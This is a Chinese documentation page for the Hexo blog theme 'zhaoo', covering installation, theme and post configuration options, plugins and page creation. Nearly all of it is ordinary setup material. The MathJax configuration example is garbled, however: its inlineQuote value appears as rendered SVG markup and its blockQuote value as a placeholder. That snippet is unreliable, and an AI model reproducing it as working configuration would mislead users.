<p>如有疑惑欢迎加鹅群咨询：<strong>550262893</strong><br>约定：无特殊说明时，文中“博客配置”指 <code>/_config.yml</code>，“主题配置”指 <code>/theme/hexo-theme-zhaoo/_config.yml</code>，缺省为“主题配置”。</p>
</blockquote>
<p style="text-align: right;">文档更新于：2021年4月4日</p>

<h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><h3 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h3><p>安装 <code>Hexo</code> 后进入根目录：</p>
<pre><code class="bash">$ cd hexo</code></pre>
<p>安装 <code>zhaoo</code> 主题：</p>
<pre><code class="bash">$ git clone https://github.com/izhaoo/hexo-theme-zhaoo.git themes/zhaoo</code></pre>
<h3 id="开启主题"><a href="#开启主题" class="headerlink" title="开启主题"></a>开启主题</h3><p>修改 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件启用 <code>zhaoo</code> 主题：</p>
<pre><code class="yml">theme: zhaoo</code></pre>
<p>启动 <code>Hexo</code> 服务器预览：</p>
<pre><code class="bash">$ hexo clean &amp;&amp; hexo s</code></pre>
<h3 id="博客配置"><a href="#博客配置" class="headerlink" title="博客配置"></a>博客配置</h3><p>编辑 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件，配置博客网站相关功能，对整个网站生效。</p>
<p>建议将文章数量改为<strong>9</strong>篇：</p>
<pre><code class="yml">index_generator:
  path: &#39;&#39;
  per_page: 9  #文章数量改为9篇（3的倍数更和谐）
  order_by: -date</code></pre>
<p>启用代码高亮效果：</p>
<pre><code class="yml">highlight:
  enable: true  #启用代码高亮效果
  line_number: true
  auto_detect: true
  hljs: true
  tab_replace:</code></pre>
<p>编辑 <code>zhaoo</code> 主题目录下的 <code>_config.yml</code> 文件，配置主题相关功能，只对主题生效。</p>
<p>建议参考 <a href="https://github.com/izhaoo/hexo-theme-zhaoo/blob/master/_config.yml">_config.yml</a> 和本文进行配置，具体配置内容见下文。</p>
<h3 id="主题更新"><a href="#主题更新" class="headerlink" title="主题更新"></a>主题更新</h3><p>进入到 <code>zhaoo</code> 主题目录：</p>
<pre><code class="bash">$ cd themes/zhaoo</code></pre>
<p>从 <code>GitHub</code> 获取更新：</p>
<pre><code class="bash">$ git pull</code></pre>
<h2 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h2><h3 id="头部导航-NavBar"><a href="#头部导航-NavBar" class="headerlink" title="头部导航 (NavBar)"></a>头部导航 (NavBar)</h3><p>配置项 <code>navbar</code> 用于设置 <strong>头部导航条</strong>。</p>
<pre><code class="yml">navbar:
  enable: true
  back_home: true</code></pre>
<p><code>enable</code> 用于控制头部导航条全局显示/隐藏。</p>
<p><code>back_home</code> 用于开启返回首页按钮；其余的功能按钮随各自配置开启，例如“二维码”、“黑夜模式”、“搜索”等。</p>
<h3 id="导航菜单-Menu"><a href="#导航菜单-Menu" class="headerlink" title="导航菜单 (Menu)"></a>导航菜单 (Menu)</h3><p>配置项 <code>menu</code> 用于设置 <strong>导航菜单</strong>。</p>
<pre><code class="yml"># Menu
menu:
  home: / || 首页
  galleries: /galleries || 摄影
  archives: /archives || 归档
  tags: /tags || 标签
  categories: /categories || 分类
  about: /about || 关于</code></pre>
<p>用 <strong>||</strong> 将内容分割为两部分，前面部分为页面 <code>URL</code>，后面部分为菜单中显示的名称。</p>
<p>对于系统默认页面，如 <code>归档（/archives）</code>、<code>首页（/）</code> 等，直接添加菜单即可；对于独立页面，如 <code>标签（tags）</code>、<code>分类（categories）</code>，则需先创建页面后再添加菜单。</p>
<h3 id="主题颜色"><a href="#主题颜色" class="headerlink" title="主题颜色"></a>主题颜色</h3><p>可以根据个人喜好，定制主题颜色。在配置项 <code>color</code> 中设置颜色。</p>
<pre><code class="yml"># Color
color:
  text: &#39;#33333D&#39;
  text-secondary: &#39;#4e4e4e&#39;
  text-third: &#39;#999999&#39;
  background: &#39;#ffffff&#39;
  background-secondary: &#39;#f6f8fa&#39;
  border: &#39;#eeeeee&#39;
  text-dark: &#39;#dddddd&#39;
  text-secondary-dark: &#39;#9899ab&#39;
  text-third-dark: &#39;#7d8594&#39;
  background-dark: &#39;#1e2128&#39;
  background-secondary-dark: &#39;#1a1d22&#39;
  border-dark: &#39;#2b3038&#39;
  link: &#39;#FF3B00&#39;</code></pre>
<p>可以使用 <code>十六进制</code>、<code>rgba</code>、<code>颜色名称</code> 方式，注意需要用引号包裹。</p>
<p>目前有两套颜色模式，分别是 <strong>浅色模式（白天）</strong> 和 <strong>深色模式（黑夜）</strong>，请注意颜色搭配。<code>link</code> 为强调色，表现为 <code>hover</code>、<code>active</code> 等。</p>
<p>分享几个配色网站：<a href="https://colors.ichuantong.cn/">中国传统颜色</a>、<a href="https://nipponcolors.com/">日本传统颜色</a></p>
<h3 id="站点图标"><a href="#站点图标" class="headerlink" title="站点图标"></a>站点图标</h3><p>配置项 <code>favicon</code> 可设置站点图标，建议使用 <code>ico</code> 或 <code>png</code> 格式。</p>
<pre><code class="yml"># Favicon
favicon:
  small: /images/icons/favicon-16x16.png
  medium: /images/icons/favicon-32x32.png
  apple_touch_icon: /images/icons/apple-touch-icon.png
  safari_pinned_tab: /images/icons/stun-logo.svg
  msapplication: /images/icons/favicon-144x144.png</code></pre>
<p>有多种尺寸的图片需要配置，可以参考默认图标的尺寸用 <code>PS</code> 裁剪，或使用：<a href="https://icon.wuruihong.com/">图标工厂</a></p>
<h3 id="全局字体"><a href="#全局字体" class="headerlink" title="全局字体"></a>全局字体</h3><p>配置项 <code>font</code> 中可设置全局字体的 <strong>大小</strong> 和 <strong>风格系列</strong>。</p>
<pre><code class="yml"># Font
font:
  size: 14px
  family: &#39;Hiragino Sans GB&#39;, &#39;Hiragino Sans GB W3&#39;, &#39;Microsoft YaHei&#39;, &#39;WenQuanYi Micro Hei&#39;, sans-serif</code></pre>
<ul>
<li><code>size</code>: 字体大小。</li>
<li><code>family</code>: 字体风格系列。</li>
</ul>
<h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>配置项 <code>background_image</code> 可设置背景图片，直接填写图片地址即可。</p>
<pre><code class="yml"># Background Image
background_image:</code></pre>
<p>tips: 建议不设置背景图片，默认的 <strong>纯白背景</strong> 最搭配，背景颜色也可在 <a href="#主题颜色">主题颜色</a> 中设置。</p>
<h3 id="加载动画-Loading"><a href="#加载动画-Loading" class="headerlink" title="加载动画 (Loading)"></a>加载动画 (Loading)</h3><p>配置项 <code>loading</code> 可设置载入动画，会在 <em>页面跳转<em>、</em>懒加载</em> 时加载，目前仅支持图片形式。</p>
<pre><code class="yml"># Loading
loading: /images/theme/loading.gif</code></pre>
<p>建议使用 <code>gif</code> 动图，可在 <a href="https://lottiefiles.com/">LottieFiles</a> 下载。</p>
<p>tips: 未来将支持自定义 <code>css</code>、<code>svg</code> 等多种方式的载入动画，敬请期待。</p>
<h3 id="欢迎页面"><a href="#欢迎页面" class="headerlink" title="欢迎页面"></a>欢迎页面</h3><p>配置项 <code>preview</code> 中的一些列配置可自定义欢迎页面。</p>
<pre><code class="yml"># Preview
preview:
  enable: true
  model: wave # wave cloud
  background: 
    type: image # image video
    default_image:
      light: /images/theme/welcome-image.jpg
      dark: /images/theme/welcome-image.jpg
    video:
    api: # https://source.unsplash.com/random/1920x1080
    size: cover # css: background-size
    position: center # css: background-position
  motto:
    default: 我在开了灯的床头下，想问问自己的心啊。
    api: https://v1.hitokoto.cn/?encode=text&amp;c=j
    color: &#39;#ffffff&#39;</code></pre>
<ul>
<li><code>enable</code>: 用来 <em>开启</em> / <em>关闭</em> 欢迎页面。</li>
</ul>
<h4 id="效果模式"><a href="#效果模式" class="headerlink" title="效果模式"></a>效果模式</h4><ul>
<li><code>model</code>: 设置效果模式，有 <strong>*波浪（wave）</strong> 和 <strong>云层（cloud）</strong> 两种模式可选择。</li>
</ul>
<h4 id="欢迎图片"><a href="#欢迎图片" class="headerlink" title="欢迎图片"></a>欢迎图片</h4><p>配置项 <code>background</code> 用来设置欢迎图片，其中：</p>
<ul>
<li><code>type</code>: 图片或视频。</li>
<li><code>default_image</code>: 配置静态图片，填写静态图片 <code>URL</code> 即可。开启 <a href="#深色模式">深色模式</a> 后支持配置 深色/浅色 两种模式下的背景图片。</li>
<li><code>video</code>: 配置动态视频，填写视频 <code>URL</code> 即可。</li>
<li><code>api</code>: 配置随机图片，可使用第三方 <code>API</code>，优先级 <em>随机图片（api）</em> &gt; <em>静态图片（default）</em>。推荐 <code>API</code>：<a href="https://source.unsplash.com/random/1920x1080">Unsplash</a>、<a href="https://api.vvhan.com/api/bing?type=sj">必应图片</a>。</li>
<li><code>size</code> 和 <code>position</code>: 设置图片的 <strong>尺寸</strong> 和 <strong>位置</strong>，参考 <code>CSS</code> 中的属性即可。</li>
</ul>
<h4 id="格言"><a href="#格言" class="headerlink" title="格言"></a>格言</h4><p>配置项 <code>motto</code> 用来设置格言，其中：</p>
<ul>
<li><code>default</code>: 配置静态格言，填写格言文本即可。</li>
<li><code>api</code>: 配置随机格言，可使用第三方 <code>API</code>，优先级 <em>随机格言（api）</em> &gt; <em>静态格言（default）</em>。推荐 <code>API</code>：<a href="https://hitokoto.cn/">一言</a>、<a href="https://www.jinrishici.com/">今日诗词</a>。</li>
<li><code>color</code> 配置文字颜色。</li>
</ul>
<h3 id="全局搜索"><a href="#全局搜索" class="headerlink" title="全局搜索"></a>全局搜索</h3><p>前置条件：需要开启<a href="#头部导航">头部导航</a>，否则会找不到入口滴。</p>
<p>目前仅支持静态搜索能力（渲染时生成搜索索引文件），需要安装 <a href="https://github.com/theme-next/hexo-generator-searchdb">hexo-generator-searchdb</a> 插件提供支持。</p>
<p>安装 <code>hexo-generator-searchdb</code> 插件：</p>
<pre><code class="bash">$ npm install hexo-generator-searchdb --save</code></pre>
<p>开启插件，在 <strong>博客配置</strong> 下新增：</p>
<pre><code class="yml">search:
  path: /search.xml  # 索引生成路径（需要设置绝对路径，否则二级页面读不到）
  field: post  # post page all
  format: html  # 只支持 html 类型
  content: true  # 是否包含正文内容</code></pre>
<h3 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h3><p>配置项 <code>copyright</code> 用来设置页面底部显示的网站版权信息，填写 <strong>文本内容</strong> 或 <strong>HTML</strong> 即可。</p>
<pre><code class="yml"># Copyright
copyright: &lt;p&gt;Powered by &lt;a target=&quot;_blank&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;  |  Theme - &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/izhaoo/hexo-theme-zhaoo&quot;&gt;zhaoo&lt;/a&gt;&lt;/p&gt;</code></pre>
<h3 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a>社交链接</h3><p>配置项 <code>social</code> 用来配置社交链接，在页面底部以 <code>Icon</code> 图标的形式展示，点击即可链接第三方平台。</p>
<pre><code class="yml"># Social
social:
  qq: tencent://message/?Menu=yes&amp;uin=894519210 || iconQQ || &#39;#12B7F5&#39;
  wechat: javascript:; || iconwechat-fill || &#39;#09BB07&#39;
  instagram: https://www.instagram.com/izhaoo/ || iconinstagram || &#39;#DA2E76&#39;
  github: https://github.com/izhaoo || icongithub-fill || &#39;#24292E&#39;
  email: mailto:izhaoo@163.com || iconmail</code></pre>
<p>配置内容分为三部分，以 <code>||</code> 划分。第一部分是 <em>社交链接</em> ，第二部分是 <em>图标样式（IconFont）</em> ，第三部分是 <em>选中颜色（hover）</em>。</p>
<h3 id="右下角按钮-Fab"><a href="#右下角按钮-Fab" class="headerlink" title="右下角按钮 (Fab)"></a>右下角按钮 (Fab)</h3><p>配置项 <code>fab</code> 用于配置右下角的按钮。</p>
<pre><code class="yml"># Fab (Float Action Button)
fab:
  enable: true
  always_show: false</code></pre>
<ul>
<li><code>enable</code>: 设置 <em>开启</em> / <em>关闭</em> 按钮。</li>
<li><code>always_show</code>: 设置 <em>一直显示</em> / <em>过渡隐藏</em> 按钮。</li>
</ul>
<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>配置项 <code>qrcode</code> 用来设置 <strong>二维码</strong>，开启后点击 <strong>导航栏</strong> 左侧的图标即可显示。</p>
<pre><code class="yml"># QR Code
qrcode:
  enable: true
  type: image # url image
  image: https://pic.izhaoo.com/weapp-code.jpg</code></pre>
<ul>
<li><code>enable</code>: 设置 <em>开启</em> / <em>关闭</em> 二维码功能。</li>
<li><code>type</code>: 设置二维码模式，有两种模式可选。<code>url</code> 显示当前文章链接生成的二维码；<code>image</code> 显示固定的二维码图片（如小程序码等）。</li>
<li><code>image</code>: 选择 <code>image</code> 模式时需要指定图片链接。</li>
</ul>
<h3 id="深色模式"><a href="#深色模式" class="headerlink" title="深色模式"></a>深色模式</h3><p>配置项 <code>color_mode</code> 用来配置 <strong>深色模式</strong>。开启后主题会根据设备系统自动切换颜色模式，用户也可以点击 <strong>导航栏</strong> 左侧的图标手动切换颜色模式，系统会暂存用户选择状态。</p>
<pre><code class="yml"># Color Mode
color_mode:
  enable: true</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 深色模式。</li>
</ul>
<p><em>深色模式</em> / <em>浅色模式</em> 的颜色可以参考 <a href="#主题颜色">主题颜色</a> 设置。</p>
<h3 id="哀悼模式"><a href="#哀悼模式" class="headerlink" title="哀悼模式"></a>哀悼模式</h3><p>在举国默哀的日子，我们可以将博客灰化，通过配置项 <code>gray</code> 设置。</p>
<pre><code class="yml"># Gray (Mourning Mode)
gray:
  enable: true  #开启哀悼模式</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 哀悼模式。</li>
</ul>
<p><img  src="https://pic.izhaoo.com/20201016102727.jpg"  ><span class="image-caption">哀悼</span></p>
<h2 id="文章配置"><a href="#文章配置" class="headerlink" title="文章配置"></a>文章配置</h2><h3 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h3><h4 id="单独封面"><a href="#单独封面" class="headerlink" title="单独封面"></a>单独封面</h4><p>可以为每篇文章设置单独的文章封面图片，在文章 <code>Front-matter</code> 中添加 <code>image</code> 字段设置图片。</p>
<p>若使用图床，直接添加图片文件的 <strong>完整URL</strong> 即可：</p>
<pre><code class="markdown">---
title: zhaoo - 主题文档
image: https://pic.izhaoo.com/20200421200902.jpg  #设置图床图片
---</code></pre>
<p>若将图片储存在本地，现将图片文件复制到主题 <code>~/zhaoo/source/images</code> 下，再添加 <strong>相对URL</strong> 即可：</p>
<pre><code class="markdown">---
title: zhaoo - 主题使用文档
image: /images/20200421200902.jpg  #设置本地图片
---</code></pre>
<h4 id="默认封面"><a href="#默认封面" class="headerlink" title="默认封面"></a>默认封面</h4><p>配置项 <code>post_image</code> 设置配置文章默认封面，就不用为每篇文章单独设置封面了：</p>
<pre><code class="yml"># Post Image
post_image:
  random: galleries # local galleries
  default: /images/theme/post-image.jpg</code></pre>
<ul>
<li><code>random</code>: 设置随机封面，有 <strong>galleries（相册图库）</strong> 和 <strong>local（本地图库）</strong>  两种模式。开启 <a href="#相册">相册</a> 功能后会自动调取相册中的图片；本地图库需要新建 <code>/_data/local_images.json</code> 文件，填写图片 <code>URL</code> 列表即可。</li>
<li><code>default</code>: 未设置随机封面时启用 <strong>默认封面</strong>，填写图片 <code>URL</code> 即可。</li>
</ul>
<pre><code class="json">// local_images.json
[
  &quot;https://pic.izhaoo.com/2014031601.jpg&quot;,
  &quot;https://pic.izhaoo.com/2017071602.jpg&quot;,
  &quot;https://pic.izhaoo.com/2017071603.jpg&quot;,
  &quot;https://pic.izhaoo.com/2017072104.jpg&quot;,
  &quot;https://pic.izhaoo.com/2017072705.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200421201200.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200305030152.jpg&quot;,
  &quot;https://pic.izhaoo.com/20191211065241.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200228081718.jpg&quot;,
  &quot;https://pic.izhaoo.com/20191211065844.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200718151924.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200718152003.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200718152045.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200718152122.jpg&quot;,
  &quot;https://pic.izhaoo.com/20200718151427.jpg&quot;
]</code></pre>
<h3 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h3><p>在文章 <code>Front-matter</code> 中添加 <code>keywords</code> 字段设置关键词：</p>
<pre><code class="markdown">title: zhaoo - 主题使用文档
keywords: hexo-theme-zhaoo, hexo, 主题, 使用文档, document</code></pre>
<p>配置项 <code>keywords</code> 为网站设置全局关键词，每个页面都会渲染，文章中无需重复添加：</p>
<pre><code class="yml">keywords: hexo-theme-zhaoo, hexo</code></pre>
<h3 id="文章尺寸"><a href="#文章尺寸" class="headerlink" title="文章尺寸"></a>文章尺寸</h3><p>配置项 <code>post_page_size</code> 用于设置文章内容主体部分的相关尺寸。</p>
<pre><code class="yml"># Page Size
post_page_size:
  width: 800px</code></pre>
<ul>
<li><code>width</code>: 设置内容宽度。</li>
</ul>
<p>tips: 受外部元素的限制，<em>实际尺寸</em> 由计算后得出，不能保证与 <em>设定尺寸</em> 完全相等，只能保证接近该尺寸。</p>
<h3 id="图片标注"><a href="#图片标注" class="headerlink" title="图片标注"></a>图片标注</h3><p>配置项 <code>caption</code> 用于设置 <strong>图片标注</strong>，开启后会在文章图片下方生成标注。</p>
<pre><code class="yml"># Caption
caption:
  enable: true</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 图片标注。</li>
</ul>
<h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><p>配置项 <code>toc</code> 用于设置 <strong>文章目录</strong>，开启后会在文章内容右侧生成目录，点击目录可平滑到对应的标题处。</p>
<pre><code class="yml"># TOC
toc:
  enable: true
  min_depth: 1
  max_depth: 3</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 文章目录。</li>
<li><code>min_depth</code>:</li>
<li><code>max_depth</code>:</li>
</ul>
<p>全局开启 <strong>文章目录</strong> 后，可以在文章 <code>Front-matter</code> 中添加 <code>toc</code> 字段单独控制该文章是否展示文章目录。</p>
<pre><code class="markdown">---
title: zhaoo - 主题文档
toc: false # 关闭文章目录
---</code></pre>
<h3 id="打赏二维码"><a href="#打赏二维码" class="headerlink" title="打赏二维码"></a>打赏二维码</h3><p>配置项 <code>donate</code> 用于设置 <strong>打赏二维码</strong>，开启后可在文章下方展示二维码，扫一扫请博主喝杯咖啡吧~</p>
<pre><code class="yml"># Donate
donate:
  enable: true
  alipay: https://pic.izhaoo.com/alipay.jpg
  wechat: https://pic.izhaoo.com/wechat.jpg</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 打赏二维码。</li>
<li><code>alipay</code>: 支付宝收款二维码，填写图片 <code>URL</code>。</li>
<li><code>wechat</code>: 微信收款二维码，填写图片 <code>URL</code>。</li>
</ul>
<h3 id="文章版权"><a href="#文章版权" class="headerlink" title="文章版权"></a>文章版权</h3><p>配置项 <code>post_copyright</code> 用于设置 <strong>文章版权</strong>，开启后可在文章下方展示版权信息。</p>
<pre><code class="yml"># Copyright
post_copyright:
  enable: true</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 文章版权信息。</li>
</ul>
<p>全局开启 <strong>文章版权</strong> 后，可以在文章 <code>Front-matter</code> 中添加 <code>copyright</code> 字段单独控制该文章是否展示文章版权。</p>
<pre><code class="markdown">---
title: zhaoo - 主题文档
copyright: false # 关闭文章版权
---</code></pre>
<h3 id="文章搬运"><a href="#文章搬运" class="headerlink" title="文章搬运"></a>文章搬运</h3><p>配置项 <code>carrier</code> 用于开启 <strong>文章搬运</strong> 功能，方便博主们全文“借鉴”文章，效果如下：</p>
<p><img  src="https://pic.izhaoo.com/20200727125519.jpg"  ><span class="image-caption">文章搬运</span></p>
<p><img  src="https://pic.izhaoo.com/20200727125724.jpg"  ><span class="image-caption">弹窗提示</span></p>
<p>前置条件：全局开启 <a href="#文章版权">文章版权</a></p>
<pre><code class="yml"># Carrier
carrier:
  enable: true
  type: markdown # markdown html text</code></pre>
<ul>
<li><code>enable</code>: <em>开启</em> / <em>关闭</em> 文章搬运。</li>
<li><code>type</code>: 搬运模式，可选择一键复制 <code>markdown</code>、<code>html</code>、<code>text</code> 格式的文章。</li>
</ul>
<blockquote>
<p><a href="http://localhost:4000/2020/07/25/hexo-article-carrier/">Hexo - 开发文章搬运功能</a></p>
</blockquote>
<h3 id="文章置顶"><a href="#文章置顶" class="headerlink" title="文章置顶"></a>文章置顶</h3><p>找到 <code>/node_modules/hexo-generator-index/lib/generator.js</code> 文件，替换成如下代码：</p>
<pre><code class="javascript">&#39;use strict&#39;;
var pagination = require(&#39;hexo-pagination&#39;);
module.exports = function (locals) &#123;
  var config = this.config;
  var posts = locals.posts;
  posts.data = posts.data.sort(function (a, b) &#123;
    if (a.top &amp;&amp; b.top) &#123;
      if (a.top == b.top) return b.date - a.date;
      else return b.top - a.top;
    &#125; else if (a.top &amp;&amp; !b.top) &#123;
      return -1;
    &#125; else if (!a.top &amp;&amp; b.top) &#123;
      return 1;
    &#125; else return b.date - a.date;
  &#125;);
  var paginationDir = config.pagination_dir || &#39;page&#39;;
  return pagination(&#39;&#39;, posts, &#123;
    perPage: config.index_generator.per_page,
    layout: [&#39;index&#39;, &#39;archive&#39;],
    format: paginationDir + &#39;/%d/&#39;,
    data: &#123;
      __index: true
    &#125;
  &#125;);
&#125;;</code></pre>
<p>在文章的 <code>Front-matter</code> 中添加 <code>top</code> 字段，指定数值。数值越大，显示越靠前。</p>
<pre><code class="markdown">---
title: zhaoo - 主题使用文档
top: 10  #添加该字段
---</code></pre>
<h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><h4 id="MathJax"><a href="#MathJax" class="headerlink" title="MathJax"></a>MathJax</h4><blockquote>
<p><a href="https://github.com/ikeq/hexo-filter-mathjax-ssr">hexo-filter-mathjax-ssr</a></p>
</blockquote>
<p>以 <code>svg</code> 的形式渲染数学公式，兼容性较好，推荐使用。</p>
<p>安装 <code>MathJax</code> 插件依赖：</p>
<pre><code class="bash">$ npm install hexo-filter-mathjax-ssr --save</code></pre>
<p>开启插件，在 <strong>博客配置</strong> 下新增：</p>
<pre><code class="yml">mathjax:
  inlineQuote: [&#39;<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="2.016ex" height="2.843ex" style="vertical-align: -0.671ex;" viewBox="0 -934.9 868.1 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">', '</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="0" y="583"></use>
<g transform="translate(294,0)">
 <use xlink:href="#E1-MJMAIN-2C" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="393" y="583"></use>
</g>
</g>
</svg>&#39;]
  blockQuote: [&#39;MATHJAX-SSR-2&#39;]</code></pre>
<h4 id="KaTex"><a href="#KaTex" class="headerlink" title="KaTex"></a>KaTex</h4><blockquote>
<p><a href="https://github.com/thcd/hexo-katex">hexo-katex</a></p>
</blockquote>
<p>以 <code>HTML</code> 标签的形式渲染数学公式，渲染速度较快，语法较简单，但是兼容性不是很好。</p>
<p>安装渲染引擎 <code>hexo-renderer-pandoc</code>：</p>
<pre><code class="bash">$ npm install hexo-renderer-pandoc --save</code></pre>
<p>安装 <code>KaTex</code> 插件依赖：</p>
<pre><code class="bash">$ npm install hexo-katex --save</code></pre>
<p>开启插件，在 <strong>博客配置</strong> 下新增：</p>
<pre><code class="yml">pandoc:
  mathEngine: katex</code></pre>
<h2 id="页面配置"><a href="#页面配置" class="headerlink" title="页面配置"></a>页面配置</h2><h3 id="相册页面"><a href="#相册页面" class="headerlink" title="相册页面"></a>相册页面</h3><blockquote>
<p>【瀑布流风格相册】由 <a href="https://github.com/HelloAny">AmiKara</a> 友情贡献~</p>
</blockquote>
<p>执行以下命令创建相册页面，会在 <code>source</code> 目录生成 <code>galleries/index.md</code> 文件：</p>
<pre><code class="bash">$ hexo new page galleries  #创建相册页面</code></pre>
<p>打开 <code>source/galleries/index.md</code> 文件，设置 <code>Front-matter</code> ，开启相册页面：</p>
<pre><code class="markdown">---
title: 相册
layout: &quot;galleries&quot;
---</code></pre>
<p>参考 <a href="#导航菜单">导航菜单</a> 设置相册页面的导航：</p>
<pre><code class="yml">menu:
  galleries: /galleries || 相册</code></pre>
<p>配置项 <code>galleries</code> 用于开启相册功能：</p>
<pre><code class="yml">galleries:
  enable: true
  title: 相册
  subtitle: Galleries
  type: waterfull # waterful | grid
  columns: 3</code></pre>
<ul>
<li><code>enable</code>:  <em>开启</em> / <em>关闭</em> 相册功能。</li>
<li><code>title</code>: 相册分类页面标题。</li>
<li><code>subtitle</code> 相册分类页面副标题。</li>
<li><code>type</code>: 相册显示风格，有 <em>瀑布流</em> 和 <em>正方形</em> 两种形式。</li>
<li><code>columns</code>: 相册列数。</li>
</ul>
<p>在 <code>/_data</code> 目录下新建 <code>galleries.json</code> 文件，创建相册分类目录及图片内容：</p>
<pre><code class="json">[&#123;
  &quot;name&quot;: &quot;colorful&quot;,  //相册名称
  &quot;cover&quot;: &quot;/images/theme/post-image.jpg&quot;,  //相册封面
  &quot;description&quot;: &quot;君未看花时，花与君同寂；君来看花日，花色一时明。&quot;,  //相册介绍
  &quot;photos&quot;: [  //图片内容
    &quot;/images/theme/post-image.jpg&quot;,
    &quot;/images/theme/post-image.jpg&quot;,
    &quot;/images/theme/post-image.jpg&quot;,
    &quot;/images/theme/post-image.jpg&quot;
  ]
&#125;, &#123;
  &quot;name&quot;: &quot;记事&quot;,
  &quot;cover&quot;: &quot;/images/theme/post-image.jpg&quot;,
  &quot;description&quot;: &quot;翻开随身携带的记事本，写着许多事都是关于你。&quot;,
  &quot;photos&quot;: [
    &quot;/images/theme/post-image.jpg&quot;,
    &quot;/images/theme/post-image.jpg&quot;,
    &quot;/images/theme/post-image.jpg&quot;,
    &quot;/images/theme/post-image.jpg&quot;
  ]
&#125;]</code></pre>
<p>在 <code>/source/galleries/</code> 目录下 <code>新建文件夹</code> ，命名需要和 <code>json</code> 中的 <code>name</code> 字段对应，例如：<em>colorful</em>、<em>记事</em>。 在文件夹下新建 <code>index.md</code> 文件，内容如下：</p>
<pre><code class="markdown">---
title: 记事  #名称也需要对应
layout: &quot;gallery&quot;
---</code></pre>
<p>步骤可能有点难以理解，最后放几张截图，比较直观：</p>
<p><img  src="https://pic.izhaoo.com/20200722185650.jpg"  ><span class="image-caption">gallery-1</span></p>
<p><img  src="https://pic.izhaoo.com/20200722185721.jpg"  ><span class="image-caption">gallery-2</span></p>
<p><img  src="https://pic.izhaoo.com/20200722185814.jpg"  ><span class="image-caption">gallery-3</span></p>
<p><img  src="https://pic.izhaoo.com/20200722185829.jpg"  ><span class="image-caption">gallery-4</span></p>
<p>也可以参考 <code>/_example/source</code> 中的相关栗子。</p>
<h3 id="归档页面"><a href="#归档页面" class="headerlink" title="归档页面"></a>归档页面</h3><p>参考 <a href="#导航菜单">导航菜单</a> 设置归档页面的导航，系统会按文章创建时间自动归档。</p>
<pre><code class="yml">menu:
  archives: /archives || 归档</code></pre>
<h3 id="标签页面"><a href="#标签页面" class="headerlink" title="标签页面"></a>标签页面</h3><p>执行以下命令创建标签页面，会在 <code>source</code> 目录生成 <code>tags/index.md</code> 文件：</p>
<pre><code class="bash">$ hexo new page tags  #创建标签页面</code></pre>
<p>打开 <code>source/tags/index.md</code> 文件，设置 <code>Front-matter</code> ，开启标签页面：</p>
<pre><code class="markdown">---
title: 标签
type: &quot;tags&quot;
layout: &quot;tags&quot;
---</code></pre>
<p>参考 <a href="#导航菜单">导航菜单</a> 设置标签页面的导航：</p>
<pre><code class="yml">menu:
  tags: /tags || 标签</code></pre>
<p>创建文章时，在文章的 <code>Front-matter</code> 中使用 <code>tags</code> 字段添加标签即可：</p>
<pre><code class="markdown">---
title: zhaoo - 主题使用文档
tags: [Hexo, 主题]  #设置标签
---</code></pre>
<h3 id="分类页面"><a href="#分类页面" class="headerlink" title="分类页面"></a>分类页面</h3><p>同标签页面，更改一些关键词即可。</p>
<p>执行以下命令创建分类页面，会在 <code>source</code> 目录生成 <code>categories/index.md</code> 文件：</p>
<pre><code class="bash">$ hexo new page categories  #创建分类页面</code></pre>
<p>打开 <code>source/categories/index.md</code> 文件，设置 <code>Front-matter</code> ，开启分类页面：</p>
<pre><code class="markdown">---
title: 标签
type: &quot;categories&quot;
layout: &quot;categories&quot;
---</code></pre>
<p>参考 <a href="#导航菜单">导航菜单</a> 设置分类页面的导航：</p>
<pre><code class="yml">menu:
  categories: /categories || 分类</code></pre>
